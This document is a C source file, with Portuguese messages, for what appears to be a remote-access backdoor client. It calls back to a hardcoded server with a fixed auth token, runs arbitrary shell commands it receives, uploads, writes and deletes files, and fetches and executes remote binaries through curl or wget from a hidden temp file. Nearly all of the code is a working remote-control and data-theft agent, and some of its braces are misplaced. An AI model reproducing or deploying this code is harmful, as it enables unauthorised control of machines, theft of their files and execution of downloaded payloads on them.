#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>
#include <pthread.h>
#include <errno.h>
#include <sys/stat.h>
#include "crypto.h"

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 12345
#define PASSWORD "foobar"
#define AUTH_TOKEN "m3uC0d1g0s3cr3t0"

int file_exists(const char *path) {
    return access(path, F_OK) == 0;
}

const char* find_writable_tmp() {
    if (access("/tmp", W_OK) == 0) return "/tmp";
    if (access("/var/tmp", W_OK) == 0) return "/var/tmp";
    if (access(".", W_OK) == 0) return ".";
    return NULL;
}

const char* find_downloader() {
    if (system("command -v curl > /dev/null 2>&1") == 0) return "curl";
    if (system("command -v wget > /dev/null 2>&1") == 0) return "wget";
    return NULL;
}

void perform_update(const char *url) {
    const char *tmp_dir = find_writable_tmp();
    if (!tmp_dir) {
        printf("[-] Nenhum diretório de escrita disponível.\n");
        return;
    }

    const char *downloader = find_downloader();
    if (!downloader) {
        printf("[-] Nenhum downloader disponível (curl ou wget).\n");
        return;
    }

    char new_bin[1024];
    snprintf(new_bin, sizeof(new_bin), "%s/.update.bin", tmp_dir);

    char cmd[2048];
    if (strcmp(downloader, "curl") == 0)
        snprintf(cmd, sizeof(cmd), "curl -fsSL \"%s\" -o \"%s\"", url, new_bin);
    else
        snprintf(cmd, sizeof(cmd), "wget -q \"%s\" -O \"%s\"", url, new_bin);

    printf("[*] Baixando atualização com %s...\n", downloader);
    int res = system(cmd);
    if (res != 0 || !file_exists(new_bin)) {
        printf("[-] Falha ao baixar o binário.\n");
        return;
    }

    chmod(new_bin, 0755);
    printf("[+] Novo binário salvo em: %s\n", new_bin);

    pid_t pid = fork();
    if (pid == 0) {
        execl(new_bin, new_bin, NULL);
        _exit(1);
    } else if (pid > 0) {
        printf("[*] Atualização iniciada com PID %d. Encerrando atual.\n", pid);
        exit(0);
    } else {
        perror("[-] Erro no fork");
    }
}


int connect_to_server() {
    int sock;
    struct sockaddr_in server;

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { perror("socket"); sleep(5); continue; }

        server.sin_family = AF_INET;
        server.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0)
            break;

        perror("connect"); close(sock); sleep(5);
    }

    return sock;
}

typedef struct {
    int sock;
    char command[1024];
} exec_args;

void* exec_thread(void *arg) {
    exec_args *args = (exec_args *)arg;
    FILE *fp = popen(args->command, "r");
    if (!fp) pthread_exit(NULL);

    char output[4096] = {0};
    fread(output, 1, sizeof(output) - 1, fp);
    pclose(fp);

    unsigned char *enc;
    int enc_len;
    encrypt((unsigned char *)output, strlen(output), (unsigned char *)PASSWORD, &enc, &enc_len);
    send(args->sock, enc, enc_len, 0);
    free(enc);
    free(arg);
    pthread_exit(NULL);
}

int main() {
    signal(SIGPIPE, SIG_IGN);

    while (1) {
        int sock = connect_to_server();
        printf("[*] Conectado\n");

        unsigned char *auth_enc;
        int auth_len;
        encrypt((unsigned char *)AUTH_TOKEN, strlen(AUTH_TOKEN), (unsigned char *)PASSWORD, &auth_enc, &auth_len);
        send(sock, auth_enc, auth_len, 0);
        free(auth_enc);

        while (1) {
            unsigned char buffer[4096];
            int recv_len = recv(sock, buffer, sizeof(buffer), 0);
            if (recv_len <= 0) break;

            unsigned char *decrypted;
            int decrypted_len;
            if (!decrypt(buffer, recv_len, (unsigned char *)PASSWORD, &decrypted, &decrypted_len)) continue;

            decrypted[decrypted_len] = '\0';
            printf("[Servidor] => %s\n", decrypted);

            if (strncmp((char*)decrypted, "exec \"", 6) == 0) {
				char *start = strchr((char*)decrypted, '\"');
				char *end = strrchr((char*)decrypted, '\"');
				if (start && end && end > start) {
					char cmd[1024] = {0};
					strncpy(cmd, start + 1, end - start - 1);
					cmd[end - start - 1] = '\0';

					if (strncmp(cmd, "cd ", 3) == 0) {
						char *path = cmd + 3;
						while (path[strlen(path) - 1] == ' ')
							path[strlen(path) - 1] = '\0';

						if (chdir(path) == 0) {
							char response[] = "Diretório alterado com sucesso.\n";
							send(sock, response, strlen(response), 0);
						} else {
							char response[256];
							snprintf(response, sizeof(response), "Erro ao alterar diretório: %s\n", strerror(errno));
							send(sock, response, strlen(response), 0);
						}
					} else {
						exec_args *args = malloc(sizeof(exec_args));
						args->sock = sock;
						strncpy(args->command, cmd, sizeof(args->command) - 1);

						pthread_t tid;
						pthread_create(&tid, NULL, exec_thread, args);
						pthread_detach(tid);
					}
				}

            } else if (strncmp((char*)decrypted, "file delete \"", 13) == 0) {
                char *start = strchr((char*)decrypted, '\"');
                char *end = strrchr((char*)decrypted, '\"');
                if (start && end && end > start) {
                    char path[1024] = {0};
                    strncpy(path, start + 1, end - start - 1);
                    int result = remove(path);

                    const char *msg = result == 0 ? "Arquivo deletado com sucesso" : "Erro ao deletar o arquivo";
                    unsigned char *enc;
                    int enc_len;
                    encrypt((unsigned char *)msg, strlen(msg), (unsigned char *)PASSWORD, &enc, &enc_len);
                    send(sock, enc, enc_len, 0);
                    free(enc);
            } else if (strncmp((char*)decrypted, "ping", 4) == 0) {
				// responder pong
				unsigned char *pong_enc;
				int pong_len;
				encrypt((unsigned char *)"pong", 4, (unsigned char *)PASSWORD, &pong_enc, &pong_len);
				send(sock, pong_enc, pong_len, 0);
				free(pong_enc);
				continue;}
            } else if (strncmp((char*)decrypted, "file get \"", 10) == 0) {
                char *start = strchr((char*)decrypted, '\"');
                char *mid = strchr(start + 1, '\"');
                char *start2 = strchr(mid + 1, '\"');
                char *end = strrchr(start2 + 1, '\"');
                const char *msg = "file";
                unsigned char *enc;
                int enc_len;
                encrypt((unsigned char *)msg, strlen(msg), (unsigned char *)PASSWORD, &enc, &enc_len);
                send(sock, enc, enc_len, 0); 
                free(enc);

                if (start && mid && start2 && end) {
                    char remote_path[1024] = {0};
                    strncpy(remote_path, start + 1, mid - start - 1);

                    FILE *fp = fopen(remote_path, "rb");
                    if (!fp) {
                        const char *err = "Erro ao abrir o arquivo";
                        unsigned char *enc;
                        int enc_len;
                        encrypt((unsigned char *)err, strlen(err), (unsigned char *)PASSWORD, &enc, &enc_len);
                        send(sock, enc, enc_len, 0);
                        free(enc);
                    } else {
                        fseek(fp, 0, SEEK_END);
                        long size = ftell(fp);
                        rewind(fp);

                        unsigned char *filedata = malloc(size);
                        fread(filedata, 1, size, fp);
                        fclose(fp);

                        unsigned char *enc;
                        int enc_len;
                        encrypt(filedata, size, (unsigned char *)PASSWORD, &enc, &enc_len);
                        send(sock, enc, enc_len, 0);
                        free(filedata);
                        free(enc);
                    }
                }
			} else if (strncmp((char*)decrypted, "update \"", 8) == 0) {
				char *start = strchr((char*)decrypted, '\"');
				char *end = strrchr((char*)decrypted, '\"');
				if (start && end && end > start) {
					char url[1024] = {0};
					strncpy(url, start + 1, end - start - 1);
					perform_update(url);
				}
			} else if (strncmp((char*)decrypted, "file put \"", 10) == 0) {
				char *start = strchr((char*)decrypted, '\"');
				char *end = strrchr((char*)decrypted, '\"');
				if (start && end && end > start) {
					char remote_path[1024] = {0};
					strncpy(remote_path, start + 1, end - start - 1);

					const char *ready_msg = "ready_to_receive";
					unsigned char *enc_ready;
					int enc_ready_len;
					encrypt((unsigned char *)ready_msg, strlen(ready_msg), (unsigned char *)PASSWORD, &enc_ready, &enc_ready_len);
					send(sock, enc_ready, enc_ready_len, 0);
					free(enc_ready);

					unsigned char file_buffer[4096];
					int file_len = recv(sock, file_buffer, sizeof(file_buffer), 0);
					if (file_len > 0) {
						unsigned char *filedata;
						int filedata_len;
						if (decrypt(file_buffer, file_len, (unsigned char *)PASSWORD, &filedata, &filedata_len)) {
							FILE *fp = fopen(remote_path, "wb");
							if (fp) {
								fwrite(filedata, 1, filedata_len, fp);
								fclose(fp);

								const char *msg = "Arquivo recebido e salvo com sucesso";
								encrypt((unsigned char *)msg, strlen(msg), (unsigned char *)PASSWORD, &enc_ready, &enc_ready_len);
								send(sock, enc_ready, enc_ready_len, 0);
								free(enc_ready);
							} else {
								const char *err = "Erro ao salvar o arquivo";
								encrypt((unsigned char *)err, strlen(err), (unsigned char *)PASSWORD, &enc_ready, &enc_ready_len);
								send(sock, enc_ready, enc_ready_len, 0);
								free(enc_ready);
							}
							free(filedata);
						}
					}
				}
			} else {
                const char *reply = "Comando nao reconhecido";
                unsigned char *enc_reply;
                int enc_reply_len;
                encrypt((unsigned char *)reply, strlen(reply), (unsigned char *)PASSWORD, &enc_reply, &enc_reply_len);
                send(sock, enc_reply, enc_reply_len, 0);
                free(enc_reply);
            }

            free(decrypted);
        }

        printf("[-] Desconectado. Reconectando...\n");
        close(sock);
        sleep(3);
    }

    return 0;
}
